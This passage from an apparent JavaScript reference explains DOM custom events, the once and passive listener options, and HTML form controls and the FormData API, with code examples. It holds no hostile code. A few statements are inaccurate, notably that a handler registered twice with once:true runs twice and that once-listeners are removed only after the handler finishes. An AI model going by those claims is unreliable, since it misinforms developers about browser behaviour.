**Capture phase:** Event listeners can be registered for the capture phase using the `capture` option:

```javascript
parentElement.addEventListener('customEvent', (event) => {
  console.log('Capture phase');
}, { capture: true });

childElement.addEventListener('customEvent', (event) => {
  console.log('Target phase');
});

parentElement.addEventListener('customEvent', (event) => {
  console.log('Bubble phase');
});
```

### Stopping Propagation

**stopPropagation():** Prevents the event from continuing to propagate through the DOM tree but allows other listeners on the current target to execute.

**stopImmediatePropagation():** Prevents the event from reaching other listeners on the current target and all subsequent targets.

```javascript
element.addEventListener('customEvent', (event) => {
  event.stopPropagation(); // Event won't bubble to parent
  console.log('First listener');
});

element.addEventListener('customEvent', (event) => {
  console.log('Second listener'); // This still executes
});

// With stopImmediatePropagation
element.addEventListener('customEvent', (event) => {
  event.stopImmediatePropagation();
  console.log('First listener');
});

element.addEventListener('customEvent', (event) => {
  console.log('Second listener'); // This won't execute
});
```

### Cancelable Events

When `cancelable: true`, event handlers can call `preventDefault()` to signal that the default action should not be performed. The dispatcher can check the return value of `dispatchEvent()` or examine the `defaultPrevented` property.

```javascript
const event = new CustomEvent('beforeSave', {
  detail: { data: 'important' },
  cancelable: true
});

element.addEventListener('beforeSave', (event) => {
  if (event.detail.data === 'invalid') {
    event.preventDefault(); // Cancel the action
  }
});

const shouldProceed = element.dispatchEvent(event);

if (shouldProceed) {
  console.log('Event not prevented, proceed with save');
} else {
  console.log('Event was prevented, cancel save');
}

// Alternative check
if (event.defaultPrevented) {
  console.log('Action was canceled');
}
```

### Composed Events and Shadow DOM

The `composed` property controls whether events can cross shadow DOM boundaries. When `composed: true`, the event can propagate through shadow DOM boundaries into the regular DOM.

```javascript
class MyComponent extends HTMLElement {
  constructor() {
    super();
    this.attachShadow({ mode: 'open' });
    
    const button = document.createElement('button');
    button.textContent = 'Click me';
    
    button.addEventListener('click', () => {
      // Event that crosses shadow boundary
      this.dispatchEvent(new CustomEvent('componentAction', {
        detail: { action: 'clicked' },
        bubbles: true,
        composed: true // Allows event to escape shadow DOM
      }));
    });
    
    this.shadowRoot.appendChild(button);
  }
}

customElements.define('my-component', MyComponent);

// Listener outside shadow DOM
document.addEventListener('componentAction', (event) => {
  console.log('Caught outside shadow DOM:', event.detail);
});
```

### Event Target and currentTarget

**event.target:** The element that originally dispatched the event (remains constant during propagation).

**event.currentTarget:** The element whose listener is currently processing the event (changes during propagation).

```javascript
parentElement.addEventListener('customEvent', (event) => {
  console.log('Target:', event.target.id); // 'child'
  console.log('Current target:', event.currentTarget.id); // 'parent'
});

childElement.dispatchEvent(new CustomEvent('customEvent', {
  bubbles: true
}));
```

### Synchronous vs Asynchronous Dispatch

`dispatchEvent()` is synchronous by default. All event listeners execute immediately before `dispatchEvent()` returns.

```javascript
console.log('Before dispatch');

element.addEventListener('customEvent', () => {
  console.log('During dispatch');
});

element.dispatchEvent(new CustomEvent('customEvent'));

console.log('After dispatch');

// Output:
// "Before dispatch"
// "During dispatch"
// "After dispatch"
```

To dispatch asynchronously:

```javascript
setTimeout(() => {
  element.dispatchEvent(new CustomEvent('customEvent'));
}, 0);

// Or with promises
Promise.resolve().then(() => {
  element.dispatchEvent(new CustomEvent('customEvent'));
});

// Or with queueMicrotask
queueMicrotask(() => {
  element.dispatchEvent(new CustomEvent('customEvent'));
});
```

### Common Use Cases

**Component communication:** Custom events enable decoupled communication between components without direct dependencies.

```javascript
// Publisher component
class DataProvider extends HTMLElement {
  updateData(newData) {
    this.dispatchEvent(new CustomEvent('dataChanged', {
      detail: { data: newData },
      bubbles: true
    }));
  }
}

// Subscriber component
document.addEventListener('dataChanged', (event) => {
  console.log('New data:', event.detail.data);
});
```

**State management:** Custom events can propagate state changes throughout an application.

```javascript
class StateManager {
  constructor() {
    this.state = {};
    this.target = document.createElement('div');
  }
  
  setState(newState) {
    this.state = { ...this.state, ...newState };
    this.target.dispatchEvent(new CustomEvent('stateChange', {
      detail: { state: this.state }
    }));
  }
  
  subscribe(callback) {
    this.target.addEventListener('stateChange', callback);
  }
}
```

**Form validation:** Custom events can coordinate complex validation workflows.

```javascript
formElement.addEventListener('beforeSubmit', (event) => {
  if (!validateForm()) {
    event.preventDefault();
    event.target.dispatchEvent(new CustomEvent('validationFailed', {
      detail: { errors: getValidationErrors() }
    }));
  }
});
```

**Analytics and tracking:** Custom events can trigger analytics without coupling business logic to tracking code.

```javascript
button.addEventListener('click', () => {
  // Business logic
  performAction();
  
  // Trigger tracking event
  document.dispatchEvent(new CustomEvent('analytics:action', {
    detail: {
      category: 'button',
      action: 'click',
      label: button.id
    }
  }));
});
```

### Event Constructor vs CustomEvent

The base `Event` constructor can also create events but lacks the `detail` property:

```javascript
// Using Event (no detail property)
const basicEvent = new Event('myEvent', {
  bubbles: true,
  cancelable: true
});

// Using CustomEvent (with detail)
const customEvent = new CustomEvent('myEvent', {
  detail: { data: 'value' },
  bubbles: true,
  cancelable: true
});
```

For events requiring custom data, `CustomEvent` is preferred. For simple notifications without data, either constructor is acceptable.

### Timing and Event Loop

Custom events dispatched synchronously execute within the current call stack. This affects timing-sensitive operations:

```javascript
let counter = 0;

element.addEventListener('increment', () => {
  counter++;
  console.log('Listener:', counter);
});

element.dispatchEvent(new CustomEvent('increment'));
console.log('After dispatch:', counter);

// Output:
// "Listener: 1"
// "After dispatch: 1"
```

### Memory Considerations

Event listeners attached to elements can create memory leaks if not properly removed, especially in long-lived applications:

```javascript
// Adding a listener
const handler = (event) => {
  console.log(event.detail);
};

element.addEventListener('customEvent', handler);

// Removing when done
element.removeEventListener('customEvent', handler);

// Using AbortController for cleanup
const controller = new AbortController();

element.addEventListener('customEvent', handler, {
  signal: controller.signal
});

// Later: remove all listeners added with this signal
controller.abort();
```

### Event Retargeting

When events cross shadow DOM boundaries, the `target` property is retargeted to prevent leaking implementation details:

```javascript
class MyElement extends HTMLElement {
  constructor() {
    super();
    const shadow = this.attachShadow({ mode: 'open' });
    const button = document.createElement('button');
    shadow.appendChild(button);
    
    button.addEventListener('click', (e) => {
      console.log('Inside shadow:', e.target); // <button>
    });
  }
}

document.addEventListener('click', (e) => {
  // If composed: true was set, target is retargeted
  console.log('Outside shadow:', e.target); // <my-element>
});
```

### Best Practices

**Event naming:** Use namespaced names to avoid collisions (e.g., `app:userLogin` instead of `login`).

**Detail structure:** Keep detail objects consistent and well-documented for each event type.

**Bubbling strategy:** Enable bubbling (`bubbles: true`) for events that represent actions or state changes that parent elements might need to handle.

**Cancelability:** Make events cancelable (`cancelable: true`) only when there's a meaningful default action that can be prevented.

**Composed events:** Set `composed: true` only when events should intentionally cross shadow DOM boundaries.

**Documentation:** Document custom events as part of component APIs, including event names, detail structures, and bubbling behavior.

### Performance Considerations

Dispatching events and executing listeners is generally fast, but excessive event dispatching in tight loops can impact performance:

```javascript
// Potentially problematic
for (let i = 0; i < 10000; i++) {
  element.dispatchEvent(new CustomEvent('update', {
    detail: { index: i }
  }));
}

// Better: batch updates
const updates = [];
for (let i = 0; i < 10000; i++) {
  updates.push(i);
}
element.dispatchEvent(new CustomEvent('batchUpdate', {
  detail: { updates }
}));
```

### Browser Compatibility

`CustomEvent` and `dispatchEvent` are supported in all modern browsers including Chrome, Firefox, Safari, Edge, and Internet Explorer 9+. The `composed` option requires support for shadow DOM (not available in IE).

### Debugging Custom Events

Browser developer tools can monitor custom events:

```javascript
// Log all events on an element
const originalDispatch = element.dispatchEvent.bind(element);
element.dispatchEvent = function(event) {
  console.log('Dispatching:', event.type, event.detail);
  return originalDispatch(event);
};

// Monitor using monitorEvents (Chrome DevTools)
// monitorEvents(element, 'customEvent');
```

---

## once and passive Options

### EventListener Options Object

The `addEventListener` method accepts an optional third parameter that can be either a boolean (for capture phase) or an options object with specific properties. The `once` and `passive` options are part of this options object:

```javascript
element.addEventListener('click', handler, {
  once: true,
  passive: true,
  capture: false
});
```

### once Option

#### Behavior Mechanics

When `once: true` is specified, the event listener automatically removes itself after being invoked **exactly one time**. This is functionally equivalent to calling `removeEventListener` inside the handler, but more efficient and less error-prone.

```javascript
button.addEventListener('click', function handler(e) {
  console.log('Clicked!');
  // Listener is automatically removed after this executes
}, { once: true });

// Subsequent clicks do nothing - handler already removed
```

#### Internal Implementation

The browser maintains the listener registration with a flag indicating it should be removed after first invocation. The removal happens **after** the handler completes execution, meaning:

- The handler runs to completion
- Return values are processed
- Any synchronous code in the handler finishes
- Then the listener is removed from the internal registry

#### Memory Management Benefits

Using `once` prevents common memory leaks where developers forget to clean up listeners:

```javascript
// Without once - easy to forget cleanup
function loadData() {
  element.addEventListener('load', handler);
  // If this code path executes multiple times, handlers accumulate
}

// With once - automatic cleanup
function loadData() {
  element.addEventListener('load', handler, { once: true });
  // No accumulation possible
}
```

#### Multiple Registration Handling

If the same handler is registered multiple times with `once: true`, each registration is independent:

```javascript
element.addEventListener('click', handler, { once: true });
element.addEventListener('click', handler, { once: true });

// First click: handler runs TWICE (both registrations fire)
// Second click: nothing happens (both registrations removed)
```

This differs from normal listeners where duplicate registrations are ignored if the handler function reference is identical.

#### Capture Phase Interaction

The `once` option works identically in both capture and bubble phases:

```javascript
parent.addEventListener('click', handler, { 
  once: true, 
  capture: true 
});

child.addEventListener('click', handler, { 
  once: true, 
  capture: false 
});

// Click on child:
// 1. Parent's capture handler fires, then removes itself
// 2. Child's bubble handler fires, then removes itself
```

#### Removal Timing with stopPropagation

If `stopPropagation()` or `stopImmediatePropagation()` is called, the `once` listener still removes itself even though propagation was stopped:

```javascript
element.addEventListener('click', (e) => {
  e.stopImmediatePropagation();
  console.log('First handler');
}, { once: true });

element.addEventListener('click', () => {
  console.log('Second handler'); // Never runs
}, { once: true });

// After first click:
// - First handler runs and removes itself
// - Second handler never runs but is NOT removed
// - Second click will run second handler
```

### passive Option

#### Core Purpose and Performance

The `passive: true` option is a **performance optimization** that tells the browser the event handler will **not call `preventDefault()`**. This allows the browser to start scrolling or other default actions immediately without waiting for the JavaScript handler to complete.

The primary use case is touch and wheel events where scroll performance is critical:

```javascript
element.addEventListener('touchstart', handler, { passive: true });
// Browser can start scrolling immediately
// Does not need to wait for handler to check preventDefault()
```

#### preventDefault Behavior

When `passive: true` is set, calling `preventDefault()` inside the handler **does nothing** and generates a console warning:

```javascript
element.addEventListener('touchmove', (e) => {
  e.preventDefault(); // No effect!
  // Console warning: "Unable to preventDefault inside passive event listener"
}, { passive: true });
```

The `preventDefault()` call is silently ignored - it doesn't throw an error, but the default action proceeds regardless.

#### Default passive Values

Browsers set default `passive: true` for certain event types to improve performance:

**Chrome/Edge (since Chrome 56)**:

- `touchstart`
- `touchmove`
- `wheel`
- `mousewheel`

**Firefox**:

- Similar defaults for touch and wheel events

This means:

```javascript
// These are passive by default in modern browsers
element.addEventListener('touchstart', handler);
// Equivalent to: { passive: true }

// Must explicitly set passive: false to use preventDefault
element.addEventListener('touchstart', handler, { passive: false });
```

#### Checking Event.defaultPrevented

The `passive` option doesn't affect `event.defaultPrevented` - it will remain `false` even if `preventDefault()` was called in a passive listener:

```javascript
element.addEventListener('wheel', (e) => {
  e.preventDefault(); // Ignored
  console.log(e.defaultPrevented); // false
}, { passive: true });
```

#### Performance Impact Quantification

Without `passive`:

1. Touch/wheel event fires
2. Browser waits for all JavaScript handlers to complete
3. Browser checks if any handler called `preventDefault()`
4. Browser starts scroll (potentially 16-100ms later)

With `passive`:

1. Touch/wheel event fires
2. Browser starts scroll **immediately**
3. JavaScript handlers execute in parallel
4. Scroll feels instantaneous (no jank)

The delay can be 1-2 frames (16-33ms at 60fps), which is perceptible as jank during scrolling.

#### Touch Action CSS Alternative

For preventing default touch behaviors, `touch-action` CSS property is often better than non-passive listeners:

```css
.element {
  touch-action: none; /* Prevents all touch behaviors */
  touch-action: pan-y; /* Allow vertical panning only */
  touch-action: manipulation; /* Allow pan and zoom, prevent double-tap */
}
```

This is declarative, performs better, and doesn't require JavaScript.

#### Combining once and passive

Both options can be used together:

```javascript
element.addEventListener('touchstart', handler, {
  once: true,
  passive: true
});

// Handler runs once, cannot preventDefault, optimizes scroll
```

Common pattern for one-time gesture detection without blocking scroll:

```javascript
document.addEventListener('touchstart', () => {
  // Detect first touch interaction
  startApp();
}, { once: true, passive: true });
```

#### Feature Detection

Check if options are supported (mainly for older browsers):

```javascript
let passiveSupported = false;

try {
  const options = {
    get passive() {
      passiveSupported = true;
      return false;
    }
  };
  
  window.addEventListener('test', null, options);
  window.removeEventListener('test', null, options);
} catch (err) {
  passiveSupported = false;
}

// Use the feature
element.addEventListener('wheel', handler, 
  passiveSupported ? { passive: true } : false
);
```

#### Passive with Scroll Event

The `scroll` event **cannot be prevented** (it fires after scrolling already happened), making `passive` redundant but harmless:

```javascript
element.addEventListener('scroll', handler, { passive: true });
// passive has no effect - scroll is always passive-like
```

#### Wheel Event Specifics

Wheel events are particularly important for `passive` because they're used for scrolling:

```javascript
// Bad: blocks scroll performance
element.addEventListener('wheel', (e) => {
  if (shouldPrevent) {
    e.preventDefault(); // Forces browser to wait
  }
}, { passive: false });

// Good: if you don't need preventDefault
element.addEventListener('wheel', handler, { passive: true });
```

For custom scroll behavior, use `transform` instead of preventing wheel:

```javascript
element.addEventListener('wheel', (e) => {
  // Don't preventDefault, just transform
  customScrollPosition += e.deltaY;
  element.style.transform = `translateY(${-customScrollPosition}px)`;
}, { passive: true });
```

#### Passive and stopPropagation

The `passive` option only affects `preventDefault()`, not event propagation:

```javascript
element.addEventListener('touchmove', (e) => {
  e.stopPropagation(); // This still works!
  e.preventDefault(); // This is ignored
}, { passive: true });
```

#### Mobile Safari Considerations

Mobile Safari has aggressive passive defaults. To enable `preventDefault()` for touch events:

```javascript
element.addEventListener('touchstart', (e) => {
  e.preventDefault(); // Will work
}, { passive: false }); // Must explicitly set false
```

Without `passive: false`, pull-to-refresh and other gestures cannot be prevented.

#### Debugging Passive Issues

Common mistake - forgetting browser defaults:

```javascript
// This won't prevent scroll in modern browsers!
element.addEventListener('touchmove', (e) => {
  e.preventDefault(); // No effect - passive by default
});

// Must explicitly override:
element.addEventListener('touchmove', (e) => {
  e.preventDefault(); // Now works
}, { passive: false });
```

Check console for warnings about ignored `preventDefault()` calls.

#### Performance Monitoring

Measure scroll jank with passive vs non-passive:

```javascript
// Non-passive (potential jank)
let start = performance.now();
element.addEventListener('wheel', () => {
  // Heavy computation
  expensiveOperation();
}, { passive: false });

// Passive (no jank)
element.addEventListener('wheel', () => {
  // Heavy computation doesn't block scroll
  expensiveOperation();
}, { passive: true });
```

Use Chrome DevTools Performance tab to visualize frame drops.

#### Signal Option Relationship

The `signal` option (for AbortController) works alongside `once` and `passive`:

```javascript
const controller = new AbortController();

element.addEventListener('touchstart', handler, {
  once: true,
  passive: true,
  signal: controller.signal
});

// Aborts even though once: true hasn't fired yet
controller.abort();
```

Priority: `signal.abort()` > `once` auto-removal > manual `removeEventListener()`.

#### Worker Thread Considerations

Event listener options work identically in Worker contexts:

```javascript
// Inside a Worker
self.addEventListener('message', handler, {
  once: true,
  passive: true // Less relevant without DOM events
});
```

However, `passive` is mostly meaningless in Workers since there are no default actions like scrolling.

---

# Forms and Input Handling

## Form Elements and Properties

### HTMLFormElement

The `<form>` element provides the container and submission mechanism for user input controls.

**Core Properties**

```javascript
const form = document.getElementById('myForm');

// Form identification
form.name;              // String: form name attribute
form.id;                // String: form id attribute
form.action;            // String: URL for submission
form.method;            // String: "get" or "post" (lowercase)
form.enctype;           // String: encoding type
form.target;            // String: browsing context for response
form.acceptCharset;     // String: accepted character encodings
form.noValidate;        // Boolean: skip validation on submit
form.autocomplete;      // String: "on" or "off"
form.elements;          // HTMLFormControlsCollection: all form controls
form.length;            // Number: count of form controls
```

**enctype Values**

- `"application/x-www-form-urlencoded"` (default)
- `"multipart/form-data"` (required for file uploads)
- `"text/plain"` (rarely used, not recommended)

**Elements Collection**

```javascript
// Access by index
form.elements[0];

// Access by name attribute
form.elements['username'];
form.elements.username;

// RadioNodeList for same-named elements
form.elements['gender']; // Returns RadioNodeList for radio group

// Iterate all controls
for (let element of form.elements) {
  console.log(element.name, element.value);
}

// HTMLFormControlsCollection is live
console.log(form.elements.length); // Updates automatically
```

**Form Methods**

```javascript
// Programmatic submission
form.submit(); // Does NOT trigger submit event or validation

// Request submission with validation
form.requestSubmit(); // Triggers submit event and validation
form.requestSubmit(submitButton); // Simulate specific button click

// Reset to default values
form.reset(); // Triggers reset event

// Validation
form.checkValidity(); // Returns boolean, fires invalid events
form.reportValidity(); // Shows validation UI, returns boolean
```

**Form Submission Behavior**

```javascript
form.addEventListener('submit', (event) => {
  event.preventDefault(); // Prevent default submission
  
  // Custom submission logic
  const formData = new FormData(form);
  fetch(form.action, {
    method: form.method,
    body: formData
  });
});
```

**Named Access** Forms support named property access for controls:

```javascript
// If form has <input name="email">
form.email.value; // Direct access to input
form['email'].value; // Bracket notation

// Conflicts with form properties use elements
form.elements.action; // Access control named "action"
```

### Common Form Control Properties

Properties shared across `<input>`, `<textarea>`, `<select>`, and `<button>` elements.

**Identification and Association**

```javascript
const input = document.querySelector('input');

input.name;              // String: submitted field name
input.id;                // String: element id
input.form;              // HTMLFormElement: owner form (readonly)
input.labels;            // NodeList: associated <label> elements (readonly)
```

**Value and State**

```javascript
input.value;             // String: current value
input.defaultValue;      // String: initial value from HTML
input.valueAsNumber;     // Number: parsed numeric value (number/date inputs)
input.valueAsDate;       // Date: parsed date value (date inputs)

// Check if value changed from default
const isModified = input.value !== input.defaultValue;
```

**Validation States**

```javascript
input.validity;          // ValidityState object (readonly)
input.validationMessage; // String: validation error message (readonly)
input.willValidate;      // Boolean: participates in validation (readonly)

// Validity checks
input.checkValidity();   // Boolean: valid without UI
input.reportValidity();  // Boolean: valid with UI feedback
input.setCustomValidity('Custom error message'); // Set custom error
```

**Disabled and Readonly**

```javascript
input.disabled;          // Boolean: disabled state
input.readOnly;          // Boolean: readonly state (input/textarea only)

// disabled vs readonly differences:
// - disabled: not submitted, not focusable, not validatable
// - readonly: submitted, focusable, validatable
```

**Autocomplete**

```javascript
input.autocomplete;      // String: autocomplete hint
// Values: "on", "off", or token(s) like "email", "current-password", "cc-number"
```

### ValidityState Object

Returned by the `validity` property on form controls.

```javascript
const validity = input.validity;

validity.valid;              // Boolean: all checks pass
validity.valueMissing;       // Boolean: required but empty
validity.typeMismatch;       // Boolean: doesn't match type (email, url, etc.)
validity.patternMismatch;    // Boolean: doesn't match pattern
validity.tooLong;            // Boolean: exceeds maxlength
validity.tooShort;           // Boolean: below minlength
validity.rangeUnderflow;     // Boolean: below min
validity.rangeOverflow;      // Boolean: above max
validity.stepMismatch;       // Boolean: doesn't match step
validity.badInput;           // Boolean: unparseable input
validity.customError;        // Boolean: custom error set via setCustomValidity()
```

**Validation Example**

```javascript
function validateInput(input) {
  const v = input.validity;
  
  if (v.valueMissing) return 'This field is required';
  if (v.typeMismatch) return 'Invalid format';
  if (v.tooShort) return `Minimum ${input.minLength} characters`;
  if (v.tooLong) return `Maximum ${input.maxLength} characters`;
  if (v.rangeUnderflow) return `Minimum value is ${input.min}`;
  if (v.rangeOverflow) return `Maximum value is ${input.max}`;
  if (v.patternMismatch) return 'Invalid format';
  if (v.customError) return input.validationMessage;
  
  return '';
}
```

### Input Element Specifics

**Type-Specific Properties**

Different `input.type` values expose different properties:

```javascript
// Text-based inputs (text, email, password, search, tel, url)
input.maxLength;         // Number: maximum character length
input.minLength;         // Number: minimum character length
input.size;              // Number: visible width in characters
input.pattern;           // String: regex pattern for validation
input.placeholder;       // String: placeholder text

// Number inputs
input.min;               // String: minimum value
input.max;               // String: maximum value
input.step;              // String: step increment
input.valueAsNumber;     // Number: numeric value or NaN

// Date/time inputs (date, datetime-local, time, month, week)
input.min;               // String: minimum date/time
input.max;               // String: maximum date/time
input.step;              // String: step in seconds
input.valueAsDate;       // Date: parsed date or null
input.valueAsNumber;     // Number: milliseconds since epoch

// Checkbox/radio
input.checked;           // Boolean: checked state
input.defaultChecked;    // Boolean: initial checked state from HTML
input.indeterminate;     // Boolean: indeterminate state (checkbox only, not submitted)

// File input
input.files;             // FileList: selected files (readonly)
input.accept;            // String: accepted file types
input.multiple;          // Boolean: allow multiple files

// Range input
input.min;               // String: minimum value
input.max;               // String: maximum value
input.step;              // String: step increment
input.value;             // String: current value (always valid)

// Hidden input
input.value;             // String: hidden value
```

**Input Type Property**

```javascript
input.type;              // String: input type (lowercase)

// Changing type
input.type = 'email';    // Changes input behavior and validation

// [Inference] Changing type may reset value in some browsers if incompatible
```

**Checkbox and Radio States**

```javascript
const checkbox = document.querySelector('input[type="checkbox"]');
checkbox.checked = true;
checkbox.indeterminate = true; // Visual only, not a third state for submission

const radio = document.querySelector('input[type="radio"][name="group"]');
radio.checked = true; // Unchecks other radios in same name group

// Get checked radio in group
const checked = document.querySelector('input[name="group"]:checked');
const value = form.elements['group'].value; // RadioNodeList.value
```

**File Input**

```javascript
const fileInput = document.querySelector('input[type="file"]');

fileInput.files;         // FileList (readonly)
fileInput.files[0];      // First File object
fileInput.files.length;  // Number of selected files

// Clear selection
fileInput.value = '';    // Only way to clear files

// Programmatically setting files (modern browsers)
const dt = new DataTransfer();
dt.items.add(fileObject);
fileInput.files = dt.files;

// File properties
const file = fileInput.files[0];
file.name;               // String: filename
file.size;               // Number: bytes
file.type;               // String: MIME type
file.lastModified;       // Number: timestamp
```

**Number Value Handling**

```javascript
const numberInput = document.querySelector('input[type="number"]');

numberInput.value = '42.5';
numberInput.valueAsNumber; // 42.5

numberInput.value = 'invalid';
numberInput.valueAsNumber; // NaN
numberInput.validity.badInput; // true

// Stepping
numberInput.stepUp();    // Increase by step
numberInput.stepUp(5);   // Increase by 5 * step
numberInput.stepDown();  // Decrease by step
numberInput.stepDown(3); // Decrease by 3 * step
```

**Date Value Handling**

```javascript
const dateInput = document.querySelector('input[type="date"]');

dateInput.value = '2025-12-15';
dateInput.valueAsDate;   // Date object in UTC
dateInput.valueAsNumber; // Milliseconds since epoch

// [Inference] valueAsDate may return null for invalid dates
// Time zones can be complex with date inputs
```

**Selection API (Text Inputs)**

```javascript
const textInput = document.querySelector('input[type="text"]');

textInput.selectionStart; // Number: start of selection
textInput.selectionEnd;   // Number: end of selection
textInput.selectionDirection; // String: "forward", "backward", "none"

// Methods
textInput.select();      // Select all text
textInput.setSelectionRange(0, 5); // Select first 5 characters
textInput.setSelectionRange(0, 5, 'forward'); // With direction
textInput.setRangeText('new', 0, 3); // Replace range with text
```

### Textarea Element

Shares most properties with text inputs, with specific differences:

```javascript
const textarea = document.querySelector('textarea');

textarea.value;          // String: current content
textarea.defaultValue;   // String: initial content (innerHTML)
textarea.textLength;     // Number: length of value (readonly)

// Dimensions
textarea.cols;           // Number: visible columns
textarea.rows;           // Number: visible rows

// Wrapping
textarea.wrap;           // String: "soft" (default), "hard", "off"
// "hard": line breaks included in submitted value
// "soft": line breaks for display only

// Selection API (same as text inputs)
textarea.selectionStart;
textarea.selectionEnd;
textarea.selectionDirection;
textarea.select();
textarea.setSelectionRange(start, end);
```

**Value vs innerHTML**

```javascript
// Setting value
textarea.value = 'Hello\nWorld'; // Correct way
textarea.textContent = 'Hello\nWorld'; // Also works
textarea.innerHTML = 'Hello<br>World'; // Incorrect, will show literal <br>

// Reading initial value
const initial = textarea.defaultValue; // Returns initial HTML content
```

### Select Element

```javascript
const select = document.querySelector('select');

select.value;            // String: value of selected option
select.selectedIndex;    // Number: index of selected option (-1 if none)
select.selectedOptions;  // HTMLCollection: selected <option> elements
select.options;          // HTMLOptionsCollection: all <option> elements
select.length;           // Number: number of options
select.multiple;         // Boolean: allow multiple selections
select.size;             // Number: visible options (0 = dropdown, >0 = listbox)

// Access options
select.options[0];
select.options.namedItem('optionName');
select.options.item(0);

// Selected option(s)
const selected = select.selectedOptions[0]; // First selected
const allSelected = [...select.selectedOptions]; // All selected (multiple)
```

**Option Manipulation**

```javascript
// Add option
const option = new Option('Text', 'value', false, true);
// Parameters: text, value, defaultSelected, selected
select.add(option);
select.add(option, index); // Insert at index
select.add(option, beforeOption); // Insert before another option

// Remove option
select.remove(index);
select.options[index].remove();
select.options[index] = null; // Legacy removal

// Clear all options
select.options.length = 0;
// or
while (select.options.length > 0) {
  select.remove(0);
}
```

**Multiple Selection**

```javascript
const multiSelect = document.querySelector('select[multiple]');

// Get all selected values
const values = [...multiSelect.selectedOptions].map(opt => opt.value);

// Set multiple selections
multiSelect.options[0].selected = true;
multiSelect.options[2].selected = true;
multiSelect.options[5].selected = true;

// Clear selections
[...multiSelect.options].forEach(opt => opt.selected = false);
```

**Form Association**

```javascript
// Select value in FormData
const formData = new FormData(form);
formData.get('selectName'); // Single value
formData.getAll('selectName'); // Array (for multiple select)
```

### Option Element

```javascript
const option = select.options[0];

option.value;            // String: submitted value
option.text;             // String: displayed text
option.label;            // String: label attribute or text
option.selected;         // Boolean: selected state
option.defaultSelected;  // Boolean: initial selected state (selected attribute)
option.disabled;         // Boolean: disabled state
option.index;            // Number: position in parent select (readonly)
option.form;             // HTMLFormElement: owner form (readonly)
```

**Option Constructor**

```javascript
// new Option(text, value, defaultSelected, selected)
const opt1 = new Option('Display Text', 'value1');
const opt2 = new Option('Text', 'value', false, true); // Selected
const opt3 = new Option('Text'); // value defaults to text

select.add(opt1);
```

### OptGroup Element

```javascript
const optgroup = document.querySelector('optgroup');

optgroup.label;          // String: group label
optgroup.disabled;       // Boolean: disables all options in group
```

**Structure**

```html
<select>
  <optgroup label="Group 1">
    <option value="a">Option A</option>
    <option value="b">Option B</option>
  </optgroup>
  <optgroup label="Group 2" disabled>
    <option value="c">Option C</option>
  </optgroup>
</select>
```

### Button Element

```javascript
const button = document.querySelector('button');

button.type;             // String: "submit" (default), "reset", "button"
button.value;            // String: submitted value (if type="submit")
button.name;             // String: field name for submission
button.disabled;         // Boolean: disabled state
button.form;             // HTMLFormElement: owner form (readonly)
button.formAction;       // String: override form action (submit buttons)
button.formEnctype;      // String: override form enctype
button.formMethod;       // String: override form method
button.formNoValidate;   // Boolean: override form novalidate
button.formTarget;       // String: override form target
```

**Button Type Behavior**

```javascript
// type="submit" (default)
// - Submits form when clicked
// - Triggers form validation
// - Can override form attributes

// type="reset"
// - Resets form to default values
// - Triggers reset event

// type="button"
// - No default behavior
// - Use for custom JavaScript functionality
```

**Submit Button Values**

```javascript
// Only clicked submit button's name/value is submitted
<button type="submit" name="action" value="save">Save</button>
<button type="submit" name="action" value="delete">Delete</button>

// FormData will include clicked button
form.addEventListener('submit', (e) => {
  const formData = new FormData(e.target);
  console.log(formData.get('action')); // "save" or "delete"
});
```

### Fieldset Element

```javascript
const fieldset = document.querySelector('fieldset');

fieldset.disabled;       // Boolean: disables all descendant form controls
fieldset.elements;       // HTMLFormControlsCollection: contained controls (readonly)
fieldset.form;           // HTMLFormElement: owner form (readonly)
fieldset.name;           // String: fieldset name
fieldset.type;           // String: always "fieldset" (readonly)
```

**Disabled Propagation**

```javascript
// Disabling fieldset disables all controls inside
fieldset.disabled = true;

// Except <legend> content
<fieldset disabled>
  <legend><button>Enabled</button></legend>
  <input> <!-- Disabled -->
</fieldset>
```

### Label Element

```javascript
const label = document.querySelector('label');

label.htmlFor;           // String: id of associated control (for attribute)
label.control;           // HTMLElement: associated form control (readonly)
label.form;              // HTMLFormElement: owner form (readonly)
```

**Label Association Methods**

```javascript
// Explicit association via for/id
<label for="username">Username</label>
<input id="username" name="username">

label.htmlFor = 'username';
label.control; // Returns the input element

// Implicit association (nesting)
<label>
  Username
  <input name="username">
</label>

// Clicking label focuses/activates control
label.addEventListener('click', () => {
  // This happens automatically before event reaches handler
  // label.control.focus() or label.control.click() already occurred
});
```

### Output Element

```javascript
const output = document.querySelector('output');

output.value;            // String: current value
output.defaultValue;     // String: initial value
output.htmlFor;          // DOMTokenList: ids of related form controls
output.form;             // HTMLFormElement: owner form (readonly)
output.name;             // String: field name
output.type;             // String: always "output" (readonly)
output.labels;           // NodeList: associated labels (readonly)
```

**Usage Pattern**

```javascript
<input type="number" id="a" value="5">
<input type="number" id="b" value="3">
<output for="a b" name="result"></output>

const a = document.getElementById('a');
const b = document.getElementById('b');
const output = document.querySelector('output');

function calculate() {
  output.value = Number(a.value) + Number(b.value);
}

a.addEventListener('input', calculate);
b.addEventListener('input', calculate);
calculate();
```

### FormData API

Interface for constructing and manipulating form data:

```javascript
// Create from form
const formData = new FormData(form);

// Create empty
const formData = new FormData();

// Methods
formData.append('key', 'value');
formData.append('file', fileObject);
formData.set('key', 'value');    // Replaces existing
formData.get('key');             // First value
formData.getAll('key');          // All values as array
formData.has('key');             // Boolean
formData.delete('key');

// Iteration
for (let [key, value] of formData.entries()) {
  console.log(key, value);
}

for (let key of formData.keys()) {
  console.log(key);
}

for (let value of formData.values()) {
  console.log(value);
}
```

**Successful Controls**

Only certain form controls are included in FormData:

```javascript
// Included:
// - <input> (except type="image" without click, file inputs with files)
// - <textarea>
// - <select>
// - <button type="submit"> that was clicked

// Excluded:
// - Disabled controls
// - Unchecked checkboxes/radios
// - Buttons not clicked
// - Controls without name attribute
// - <input type="image"> (special handling)
```

**File Handling**

```javascript
// Single file
formData.append('avatar', fileInput.files[0]);

// Multiple files
for (let file of fileInput.files) {
  formData.append('photos[]', file);
}

// Blob with filename
formData.append('data', blob, 'filename.json');
```

### Input Modes

The `inputmode` attribute provides hints for virtual keyboards:

```javascript
input.inputMode;         // String: input mode hint

// Values:
// "none" - No virtual keyboard
// "text" - Standard keyboard
// "decimal" - Decimal numeric keyboard
// "numeric" - Numeric keyboard
// "tel" - Telephone keypad
// "search" - Search-optimized keyboard
// "email" - Email-optimized keyboard
// "url" - URL-optimized keyboard
```

**[Inference]** Input mode suggestions:

```javascript
<input type="text" inputmode="numeric"> // Numbers in text field
